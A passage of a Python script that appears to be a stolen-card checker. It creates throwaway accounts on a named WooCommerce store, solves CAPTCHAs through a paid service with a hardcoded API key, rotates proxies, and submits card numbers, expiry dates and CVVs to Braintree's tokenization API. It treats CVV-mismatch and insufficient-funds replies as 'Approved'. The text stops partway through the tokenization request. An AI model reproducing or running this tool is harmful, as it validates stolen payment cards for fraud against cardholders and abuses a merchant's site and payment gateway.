import string
import uuid
import names
import base64
import random
import capsolver
import secrets
import base64
from requests import Session
from dataclasses import dataclass
import uuid, base64, json
from retry import retry
from proxys.proxy import get_random_proxy  # Importar la función get_random_proxy

class Solverv2:
    def solver(self, url, keysite):
        self.session = Session()
        capsolver.api_key = 'CAP-49921C094F791244557416016E4CD408'
        solution = capsolver.solve({"type": "ReCaptchaV2Task", "websiteURL": url, "websiteKey": keysite})
        return solution

@dataclass
class BehaviorsBraintree:
    def ResponseHtml(self, response: str = None):   
        if 'avs_and_cvv' in response: return 'Approved! ✅', response
        elif 'cvv: Gateway Rejected: cvv' in response: return 'Approved! ✅', response
        elif 'Insufficient Funds' in response: return 'Approved! ✅', response
        elif 'avs: Gateway Rejected: avs' in response: return 'Approved! ✅', response
        elif 'CVV.' in response: return 'Approved! ✅', response
        elif 'Card Issuer Declined CVV' in response: return 'Approved! ✅', response
        elif 'Invalid postal code and cvv' in response: return 'Approved! ✅', response
        elif 'Nice! New payment method added' in response: return 'Approved! ✅', response
        elif 'Payment method successfully added.' in response: return 'Approved! ✅', response
        elif 'Invalid postal code or street address' in response: return 'Approved! ✅', response 
        elif 'CVV2 Mismatch: 15004-This transaction cannot be processed. Please enter a valid Credit Card Verification Number' in response: return 'Approved! ✅', response
        else: return 'Declined! ❌', response

    def SaveResponseHhml(self, response: str):
        with open("ResponseHhml.html", "w", encoding="utf-8") as f:
            f.write(response)

    def SessionId(self):
        self.id = str(uuid.uuid4())
        return self.id

    def Ccs(self, cards: str = None):
        if '|' in cards: 
            return cards.split('|')
        elif ':' in cards: 
            return cards.split(':')
        elif ',' in cards: 
            return cards.split(',')
        elif '-' in cards: 
            return cards.split('-')
        return cards
    
    def generate_random_email_and_uuid():
        random_email = ''.join(random.choices(string.ascii_lowercase, k=8)) + '@gmail.com'
        random_uuid = str(uuid.uuid4())
        return random_email, random_uuid

    @classmethod
    def QueryText(self, data: str = None, chainOne: str = None, chainTwo: str = None):
        try:
            self.uophs = data[data.index(chainOne) + len(chainOne):data.index(chainTwo, data.index(chainOne) + len(chainOne))]
            return self.uophs
        except: 
            return 'value not found'
    
    @classmethod    
    def RandomName(self, dato: str = None):
        if dato == 'username': 
            self.username = "{}{}{}".format(
                names.get_first_name(),
                names.get_last_name(),
                random.randint(1000000, 9999999)
            )
            return self.username
        elif dato == 'email': 
            self.email = "{}{}{}@gmail.com".format(
                names.get_first_name(),
                names.get_last_name(),
                random.randint(1000000, 9999999)
            )
            return self.email
        elif dato == 'password': 
            self.password = "{}{}#{}".format(
                names.get_first_name(),
                names.get_last_name(),
                random.randint(1000000, 9999999)
            )
            return self.password
        elif dato == 'numero':
            self.number = ''.join([str(random.randint(0, 9)) for _ in range(10)])
            return self.number
        else:
            return 'valores incorrectos: >>> BehaviorsBraintree().RandomName("username")'

    @classmethod
    def correlation_id(self):
        self.id_corre = secrets.token_hex(16)
        return self.id_corre
    
    @classmethod
    def SessionId(self):
        self.id = str(uuid.uuid4())
        return self.id

    @classmethod
    def DecodeBear(self, dato: str = None):
        self._tokenEncoding = base64.b64decode(dato).decode('utf-8') 
        self.bear_end = BehaviorsBraintree().QueryText(
            self._tokenEncoding, 
            '"authorizationFingerprint":"',  
            '","')
        return self.bear_end

    @classmethod
    def Response(self, response: str = None):   
        if 'avs_and_cvv' in response: return 'Approved! ✅', response
        elif 'Insufficient Funds' in response: return 'Approved! ✅', response
        elif 'avs: Gateway Rejected: avs' in response: return 'Approved! ✅', response
        elif 'CVV.' in response: return 'Approved! ✅', response
        elif 'Card Issuer Declined CVV' in response: return 'Approved! ✅', response
        elif 'Invalid postal code and cvv' in response: return 'Approved! ✅', response
        elif 'Nice! New payment method added' in response: return 'Approved! ✅', response
        elif 'Payment method successfully added.' in response: return 'Approved! ✅', response
        elif 'Invalid postal code or street address' in response: return 'Approved! ✅', response 
        elif 'CVV2 Mismatch: 15004-This transaction cannot be processed. Please enter a valid Credit Card Verification Number' in response: return 'Approved! ✅', response
        else: return 'Declined! ❌', response

class Braintre3:
    @retry(tries=3)
    def main(self, cards):
        try: 
            self.Nombre = BehaviorsBraintree().RandomName('username')
            self.UseMail = BehaviorsBraintree().RandomName('email')
            
            # Configurar sesión con proxy
            self.session = Session()
            proxy_dict, cert_path = get_random_proxy()  # Obtener proxy aleatorio desde proxy.py
            if proxy_dict:
                self.session.proxies.update(proxy_dict)
                print(f"DEBUG: Proxy configurado: {proxy_dict}")
                if cert_path:
                    self.session.verify = cert_path
                    print(f"DEBUG: Certificado SSL configurado: {cert_path}")
                else:
                    self.session.verify = True  # Usar verificación SSL estándar
            else:
                print("DEBUG: No se pudo obtener un proxy válido, continuando sin proxy")
                self.session.verify = True  # Usar verificación SSL estándar
            
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'es-419,es;q=0.9,en;q=0.8',
                'cache-control': 'max-age=0',
                'if-modified-since': 'Fri, 28 Dec 2018 12:56:25',
                'priority': 'u=0, i',
                'referer': 'https://bulkmemorycards.com/my-account/add-payment-method/',
                'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
                'sec-ch-ua-arch': '"x86"',
                'sec-ch-ua-bitness': '"64"',
                'sec-ch-ua-full-version': '"130.0.6723.70"',
                'sec-ch-ua-full-version-list': '"Chromium";v="130.0.6723.70", "Google Chrome";v="130.0.6723.70", "Not?A_Brand";v="99.0.0.0"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-model': '""',
                'sec-ch-ua-platform': '"Windows"',
                'sec-ch-ua-platform-version': '"10.0.0"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
            }
            self.req_1 = self.session.get('https://bulkmemorycards.com/my-account/', headers=headers)
            self.nonce_registre = BehaviorsBraintree().QueryText(self.req_1.text, 'name="woocommerce-register-nonce" value="', '"')

            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'es-419,es;q=0.9,en;q=0.8',
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://bulkmemorycards.com',
                'priority': 'u=0, i',
                'referer': 'https://bulkmemorycards.com/my-account/',
                'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
                'sec-ch-ua-arch': '"x86"',
                'sec-ch-ua-bitness': '"64"',
                'sec-ch-ua-full-version': '"130.0.6723.70"',
                'sec-ch-ua-full-version-list': '"Chromium";v="130.0.6723.70", "Google Chrome";v="130.0.6723.70", "Not?A_Brand";v="99.0.0.0"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-model': '""',
                'sec-ch-ua-platform': '"Windows"',
                'sec-ch-ua-platform-version': '"10.0.0"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
            }
            data = {
                'email': self.UseMail,
                'password': 'Cuenta1234',
                'wc_order_attribution_source_type': 'typein',
                'wc_order_attribution_referrer': 'https://bulkmemorycards.com/my-account/add-payment-method/?__cf_chl_tk=7bY3VEzzEy9IWWHaQXoaTqLbBicpPWAirP4tlDNWkJY-1730227092-1.0.1.1-iDA1n2cCkcxwWnndOtLufGFdA4WaSyNFJgac_rLRiFY',
                'wc_order_attribution_utm_campaign': '(none)',
                'wc_order_attribution_utm_source': '(direct)',
                'wc_order_attribution_utm_medium': '(none)',
                'wc_order_attribution_utm_content': '(none)',
                'wc_order_attribution_utm_id': '(none)',
                'wc_order_attribution_utm_term': '(none)',
                'wc_order_attribution_utm_source_platform': '(none)',
                'wc_order_attribution_utm_creative_format': '(none)',
                'wc_order_attribution_utm_marketing_tactic': '(none)',
                'wc_order_attribution_session_entry': 'https://bulkmemorycards.com/my-account/add-payment-method/',
                'wc_order_attribution_session_start_time': '2024-10-29 18:39:26',
                'wc_order_attribution_session_pages': '15',
                'wc_order_attribution_session_count': '1',
                'wc_order_attribution_user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
                'woocommerce-register-nonce': self.nonce_registre,
                '_wp_http_referer': '/my-account/',
                'register': 'Register',
            }
            response = self.session.post('https://bulkmemorycards.com/my-account/', headers=headers, data=data)

            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'es-419,es;q=0.9,en;q=0.8',
                'cache-control': 'max-age=0',
                'priority': 'u=0, i',
                'referer': 'https://bulkmemorycards.com/my-account/',
                'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
                'sec-ch-ua-arch': '"x86"',
                'sec-ch-ua-bitness': '"64"',
                'sec-ch-ua-full-version': '"130.0.6723.70"',
                'sec-ch-ua-full-version-list': '"Chromium";v="130.0.6723.70", "Google Chrome";v="130.0.6723.70", "Not?A_Brand";v="99.0.0.0"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-model': '""',
                'sec-ch-ua-platform': '"Windows"',
                'sec-ch-ua-platform-version': '"10.0.0"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
            }
            self.session.get('https://bulkmemorycards.com/my-account/', headers=headers) 

            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'es-419,es;q=0.9,en;q=0.8',
                'priority': 'u=0, i',
                'referer': 'https://bulkmemorycards.com/my-account/edit-address/',
                'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
                'sec-ch-ua-arch': '"x86"',
                'sec-ch-ua-bitness': '"64"',
                'sec-ch-ua-full-version': '"130.0.6723.70"',
                'sec-ch-ua-full-version-list': '"Chromium";v="130.0.6723.70", "Google Chrome";v="130.0.6723.70", "Not?A_Brand";v="99.0.0.0"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-model': '""',
                'sec-ch-ua-platform': '"Windows"',
                'sec-ch-ua-platform-version': '"10.0.0"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
            }
            self.req_4 = self.session.get('https://bulkmemorycards.com/my-account/edit-address/billing/', headers=headers)
            self.edit_address_bill = BehaviorsBraintree().QueryText(self.req_4.text, 'name="woocommerce-edit-address-nonce" value="', '"')

            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'es-419,es;q=0.9,en;q=0.8',
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://bulkmemorycards.com',
                'priority': 'u=0, i',
                'referer': 'https://bulkmemorycards.com/my-account/edit-address/billing/',
                'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
                'sec-ch-ua-arch': '"x86"',
                'sec-ch-ua-bitness': '"64"',
                'sec-ch-ua-full-version': '"130.0.6723.70"',
                'sec-ch-ua-full-version-list': '"Chromium";v="130.0.6723.70", "Google Chrome";v="130.0.6723.70", "Not?A_Brand";v="99.0.0.0"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-model': '""',
                'sec-ch-ua-platform': '"Windows"',
                'sec-ch-ua-platform-version': '"10.0.0"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
            }
            data = {
                'billing_first_name': self.Nombre,
                'billing_last_name': self.Nombre,
                'billing_company': '',
                'billing_country': 'US',
                'billing_address_1': 'Times Square, Nueva York, EE. UU.',
                'billing_address_2': '',
                'billing_city': 'Manhattan',
                'billing_state': 'NY',
                'billing_postcode': '10036',
                'billing_phone': '5667873492',
                'billing_email': self.UseMail,
                'save_address': 'Save address',
                'woocommerce-edit-address-nonce': self.edit_address_bill,
                '_wp_http_referer': '/my-account/edit-address/billing/',
                'action': 'edit_address',
            }
            self.session.post('https://bulkmemorycards.com/my-account/edit-address/billing/', headers=headers, data=data)

            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'es-419,es;q=0.9,en;q=0.8',
                'cache-control': 'max-age=0',
                'priority': 'u=0, i',
                'referer': 'https://bulkmemorycards.com/my-account/edit-address/billing/',
                'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
                'sec-ch-ua-arch': '"x86"',
                'sec-ch-ua-bitness': '"64"',
                'sec-ch-ua-full-version': '"130.0.6723.70"',
                'sec-ch-ua-full-version-list': '"Chromium";v="130.0.6723.70", "Google Chrome";v="130.0.6723.70", "Not?A_Brand";v="99.0.0.0"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-model': '""',
                'sec-ch-ua-platform': '"Windows"',
                'sec-ch-ua-platform-version': '"10.0.0"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
            }
            self.session.get('https://bulkmemorycards.com/my-account/edit-address/', headers=headers)

            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'es-419,es;q=0.9',
                'priority': 'u=0, i',
                'referer': 'https://bulkmemorycards.com/my-account/',
                'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
            }
            self.session.get('https://bulkmemorycards.com/my-account/payment-methods/', headers=headers)

            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'es-419,es;q=0.9',
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://bulkmemorycards.com',
                'priority': 'u=0, i',
                'referer': 'https://bulkmemorycards.com/my-account/add-payment-method/?__cf_chl_tk=_PrXU7SVESEwm4O73kEKcLFKonTpfAoFFsDscaVMZNg-1723828302-0.0.1.1-5140',
                'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
                'sec-ch-ua-arch': '"x86"',
                'sec-ch-ua-bitness': '"64"',
                'sec-ch-ua-full-version': '"127.0.6533.101"',
                'sec-ch-ua-full-version-list': '"Not)A;Brand";v="99.0.0.0", "Google Chrome";v="127.0.6533.101", "Chromium";v="127.0.6533.101"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-model': '""',
                'sec-ch-ua-platform': '"Windows"',
                'sec-ch-ua-platform-version': '"10.0.0"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
            }
            data = {
                '609a595b9e2431b1bdc3ebf5d1b2e4a42259e9cfa323bda41d30f540b84bffb5': 'FgSgu.2V75aJPzz1YOVd1xckHr97QqpsGV4rUL2y6eA-1723828302-1.1.1.1-BFC7PAI50T31pgfFRZUeYrmR8zboEhRUOimcl9lR76nWnRelQbqtwuQ5Cb2vX614W_IAret0cGQbZLsXZYH41HJS82pFKddR3d0gk4T1peN8lM8gNbBZn9U0ZqX5pBrO08z0xRxlimmLhYQoEqt1WEJdn0B3534y9TAhXrSZ55pdz1ioDgb39.MnDZhKDowOk1oKipyqTLz3zqsKl_3HnA8tDQ.vmsb1sfsLSm8nXkJxktOjIsCeqQqnoR8lBJgrBbVyS50Tz2U48SKI1u1KfyoVjVw.5T_ROoWnkhqPeP6mEnFRISJ21tYY8DPvwdQSd2rwpqMeSDJ90HMxCMxQzWqQRvQo5W.TbBuExXO7K1w9UbElZHCT9oZG_rv5qTmUl1UVHG.efUBJdmwkNYxWZHbwaKFRmAHXXOz_yBOpldIoWYhCI49JcJH2O2ruFleKX9MAGIvMW7fghD6rYzRVxbbjiaJ85BN1oRXGeRyj3eFONV3ny20yBQQA_V42jsC1gIWJK0UYMnh3ykFC50.aFeBMgckMLwnxPldCBuFJJXT2xh6lTmoEw5ke94IrWXdQUKRq_eMWeHNMhbOjaWhweYLV_f.7yK2U1rOB1Zo3m2h4x7SYIEC4MhAHtuj4krSEcRUIboQCPazh7pLMeYCM66VU7e66yJWL4mM_YMw_.foQ9KDy54ZQv8GL0cLREmXUK_JNsIRedEVRZPoxTou6PV_.Pv7t9XRBNp7zZUKtlrdigJsmKm05vflWiDIV1mVVXMMajMhXJ4AthOTabXAC9aHD5OUASbA.6113ejlmSF5oOQdvVLl5v.yxWbVPHT65H4zuhMzOkwJqXbE9M76TSyfrV8fZzvOfaJGf2EguBnCJex9vfc3iTE6UVSORg4dJNyYKIP9LkdZybXvcqcvsSvtGZmnLx9R.aGu6DJ5DuHab90dPT1qwZ1LTtdMjeMC8cCkcStL9Uv5TPgPcaU7R0IqHRvqnA0io2LNd20zucjET7CGwLqWXF_DxdNGbe.6mahcqwWUKvbIAtPu1lwKlj8kUKmcm8eKIr.Pf5B0y5oBxwWiyxL6RreIySytqUOm4P5xxbw75yPq0vmD30XtPZ31TNkd8QpxWrmZ4PB8EE51beEYREAl04Ulr4BgSHKqTb24n4H79ESoSJatK9uIu7arBWQy5jSGlCwPYNIvk51ZCWcgnOATisUSkCPxqjazx',
                '6fc6a0eeef3f2df743daaf60b2697a4df226551dcacbcd5259114622f72ab5cb': '5O82VcIWdiwJuFbxQptLLtuZkmRudMNl8bumv6nOqkg-1723828302-1.1.1.1-32ufhljRZIRonLCAfpSgo9_I0DBppi33i1s3MTD8tTcWHPxBo5ORDmg4RT3ow2Dx3hvRsZp4ob2wsOYeGke0nU3lWXFp9sLVPGn89L6ehSzKVpxbijZgUtD3_dNgZcPz8nlL.zzKxQzdTAjr7xzqG.WsmHVPr7msw.veIpKa6AepbrMtNSqceV0rZdusrbhJf.HuKsTjsApsfH8NLzKD4M8Dvn1c_W9vZNQrakVPuasMa6vYJq3AaNEUg1XTxw7ehf.nLlgXaGUkbFQILbgcN8FVkbtwxOf0pcXk2xp.bEvg1dx9n0lQwRWn0xuXhCRwUNcrcEHrvLngC13u7eWFAVgN6y6sFuN4XkhSMsMWLdxlkqv3Ae3A9ccEOStTewyBP3dwqepAur6riATHog10QizPmKadVYQflURPReRQRrVeQcfqjzwxQa19mXVmS4_syv4L90isP6NMM9AkbiSVJnOaI5xiLKat5KdpSRqYYgR4AephZLEIMH9ikYxiGN7KGeGvvLH_CKUqcg56Wks2CVwz30Pi3VhGPzAEOfjkke_H1Hiz8F7BmdZ9GmUTt9g9miFVuCd7x_EDH673LDNqJqSXmes.Nkc39nJ4zCPKvSoWUKV1zpHmiaiOzt0jU.Iqq3B.tX8CSWFqNbvhZDQz5wlYXvuPkziLUwwsvTna.pKEeIvQkyFwCbXxz3VFSJFtfH5aBtlImR66jrtQ7gs.Wusw_dUOjoIU5zwDJd4vniNY47YIZPP4FUAG_J9nSnUcC8ThNEIgONMIrhzq2nQ76mNDaNkO_jW19b0ipeqE_ZWui8TkW20xnJFr_FGKp5Xo5JMHClWVSXnK_zBQUc4MS4PcPBKLoyxRkwz10benbtTE271eE5WnGGhpnb6SWMnrDIxDEnNcw1TIlCBItb0a3UKP0Yc3.lFwAdWquNHMCw_06t4ujeFUwaFg_wuwp3_FNGyVRSIhXL.2tnmOeYtJC4FtMt2jj3EgIw5f.1.zjHSCgVjfltyhQobQTsRzc0ux8YyDOugjEEvom7GIn8zDjmsN3FQu7gVB2RXi1xbPPMQfBSA7qh2MppYrdC3ea_0FYxWmBlJhWF2gMQh6NN1m4qt3nOAgkbll2u5Wp9yMAsD49zusABzEzA35vyYleaYmnsdvlv3C4PAUTHR3uZ0fiQO.gAxU1zvMJT5QZImvABkOWqna2cOEEsqaI2z0Q.Rm3l98weRZQe3zSEdpI.HJhUU6vlKmWZ6tQun9BFF7BO5b2CVebGhm3cixtDHe5qQnNTZLnSJ5_wBL1il_7XZdPXHXTq2PsYumgnuFsp2o9x3oiG.5Q5lV2vDeOHRJaiP7R13k5HyB0iUW9eCV_Qpf0TNH34NLy6wHyKc5FdzARAD0CtoqAHHZ_9H_fryzAnC.0MsKImF9ygSavlzMSdfxowkBvJi4Z0ESe_AHQebnI1mAM82HqFmIi2szA9clWc8RjYiqeTjKw811t6RwU6Ky2XL.vk41lkht3Kp_fJJOIsOAa5st0TzpLeu9Y4cihZJuNDS4j0VByoPA4Ol0uutm5fwxd_M_wPC_ZapBFFrFJyBnJ56qKCnlhbmxy5OCjQwS2MmfCtb4TAtty0cMKQpd.rXLwRjXBrX92z_m6ay1R937PZlURdd3IbQixci4GABWdWmm8wye_3XjTEnPSY9aR_FVClFbk37REJ8MQs9CebDLJGsHpdXpvJsklu4tq4ehdybzGKvxlapPIsxYeh5pv.OSkHdwQvUDJHjyOMIWyWp86Hyk4ph3YyQcEVFvIAuFboc24JQW7WTQUSROzJrxrOSgEnWgSsyRxKwihK_Sot0MycUKupY8sMwbHWhybVDJqCUAiD9k_OXCIccO9BRt1rkxkhfPO8O2L3cb9m6WJtsq9VpqUdCDBuxucYSqB1G2kzAmMvUeXRzlqyPPdpK4jRdeW4T2Brftb5LRF1T_lyVT5ECDXDf4GCiYrpX8cOiqlrL6yiP6NAyf5XfmAWXRb8FY3zzQh_PWvwj0D5Hj7xccxn0PQrzjJzuplKOAHJtKxKM5TU50xGL1Zrs7oBSsLDsWuK4SPTPGvYEGimFSEAONT0p6vv3y_GmDnroCy489szBcSHZnT.ojQeHrSMFaWw1Xbt3Mwd4uYRMj6dIaU32JDC8tKc5R8C28Jd6H53NHxAflQUi9FpCw2aHgUVw6XwCY.D5vwOCEjO515ZGvCFja6JFZY0n_X2SRCTVqcDCkAshHgDB08hF5ecrZd3kvBlZnjY1TJJqSZyZfnZYDiVf_Q8G.6ng0eapcGxtqW9ubLENlxp7UR67_fFgoHS.1eDv8ElK6i_3TNDOufFYg3mjgoTYvHaxZ6jiVDev675ZIoOnhPUIp2DCktp8Zj0VYKCnjvKMmrorj4YwJWSi68PkmxLQvCazTpKgV8CU1Dxq4ZOiUT0nyHSeF0g1QGQ4Zki_c_b9qBYmgPVin4DWb9dUYoGoIYS0W6vXHxL9BlFpRzvzdO9G4Rm6kW4qLltm3vJGtHkr6nyVZRpKq7lIPKQB9IwcUbcPHBCHtNj6723g6xINz.1YT7Iit686fNtrUi7tFMyOjGg4m4impuuaDnIeTLZvFjgA6yDn4rVpTWKQ0QmUi7WL6c57zU9rZxA1Hwoq.TwduugdHeVoAfqd3iKIVs0EvYl4ADZPDl34WIPimaGTDOT3mJOZUSFBwZNBaIXZuAYrsvvPzj5oSpAeMqig2WICLnKVakBRUF9jK4FmQznDFfTJX7lhYVzF5yhn6gWUHgsyGrrFBTkCCOnjzY9eKM3AwrlaN75G4Ic2P06vCt7sLSdiNi7uXMVoHdIIlfTX3BRVqAHkXErnEER5_zzVIvk8GIEiCHcPMR3Atj5fEgZMFd7SVpZR59nCVpPqdomnBkqdYkmrztHJ9gUEM03olyKeaeTSjjH4Mr8n6mkPLLrXM2OWib72xH7v2fMN.748DKs4p1h4R7Ip_YRYd_0vjx.z_aqYXboxUg5DDU.Qqev9gZpypoJ4UZSyHVEKuV6bgplBYOP1b4UnOs75TtQBRJO7UHWy9Zud1j7GUM3GpVEXzJ2v3YSUSjt_TmQUrhpTt9fiiF_IF.87hgPR9FWkRxkz9RYK2E58epYpcEbOHpyoXATkD9Oj_V8x214jiHQjYFl5wH5y4oX4egv.Z65W6A.h27ACx6yGOgeMH6biI9j5TlvrsrODE.R5eSpKWKEcPRgSzL4RdCZCjpl6RySFkiL73FR50bXmCH7A1xmtoiFJJIPk63Auhqu2sy4nlhPS2a3EsmuyhQOVU0jy2cW9QYKd_BJlWsgIrpTdUU_85abqJclxN.Yre17OnPNXNP_LYvtBAdB3wS1uR0upFFYIbYhwTKmw.BlOI22OMjhrNDibxn6E4hvBrOEFqFz0ZBdNoxmrB6gvBTF45dTBK2emauCf0ZmwkzPAAGYINCoQTeSAZ9HxLoOlMCzgkl9cOVh6VlmD6SlFHTGiWjE_kwJVriyvkZmCf_fQv8lXC6H3VEhnqiOonLusd0lYts1PrEz.VX6gBBVAHKuuOXJQaoZGqNDh1yOoYfZ_UtdU6pdUVI6DJWLflv2CLoo_dTiQeyXQ4685Vw2HyJ4.LK3pekeq4rFb0_PbzntED5KHNFr009u.7Lwr0GPvBJkYSB9U_HvlMct5ON1Bd59i0rY1ZvcVradTVwrsjXF6Pia3jkk24moD9onONOPrpyAclgmOuX68wTow5fMHMb5cn5sy1Y2cadfP8iCvwOeMwDc7Aau1f.OtsnMQMF4jIWagehi9DZQ',
                'e5a96866eb012774e7f3b522f4e25768e651d9bde73b1c2db3bc992c3f983fea': '1e4c682de4ce2358cd0635ac7e3151c8',
                '04e3c6e2a6c8b90b2356db0ad3e1af93d37db44924078e9d5f0cf0b172f35406': 'wgPBQdTkCDJR-1-8b430b88e917478b',
                '11d63e57e7703b1c64db6bc98de548d24b6c34c76d49194b7939e33604c67ad1': '4a64be9b933cdf9b53c4a67409e2bcce|{"hhvq":"1723828306:75d2b836-6ad9-4aa7-8fc5-0f1d8492d906"}',
            }
            self.req_2 = response = self.session.post('https://bulkmemorycards.com/my-account/add-payment-method/', headers=headers, data=data)
            wc_braintree_client_token = BehaviorsBraintree().QueryText(self.req_2.text, 'var wc_braintree_client_token = ["', '"')
            payment_nonce = BehaviorsBraintree().QueryText(self.req_2.text, 'name="woocommerce-add-payment-method-nonce" value="', '"')
            self.token_bear = BehaviorsBraintree().DecodeBear(wc_braintree_client_token)
            self.client_id = BehaviorsBraintree().SessionId()
            self.ccs = BehaviorsBraintree().Ccs(cards)
            
            headers = {
                'accept': '*/*',
                'accept-language': 'es-419,es;q=0.9',
                'authorization': f'Bearer {self.token_bear}',
                'braintree-version': '2018-05-10',
                'content-type': 'application/json',
                'origin': 'https://assets.braintreegateway.com',
                'priority': 'u=1, i',
                'referer': 'https://assets.braintreegateway.com/',
                'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
            }
            json_data = {
                'clientSdkMetadata': {
                    'source': 'client',
                    'integration': 'custom',
                    'sessionId': self.client_id,
                },
                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }',
                'variables': {
                    'input': {
                        'creditCard': {
                            'number': self.ccs[0],
                            'expirationMonth': self.ccs[1],
                            'expirationYear': self.ccs[2],
                            'cvv': self.ccs[3],
                            'billingAddress': {
                                'postalCode': '10010',
                                'streetAddress': 'Times Square, Nueva York, EE. UU.',
                            },
                        },
                        'options': {
                            'validate': False,
                        },
                    },
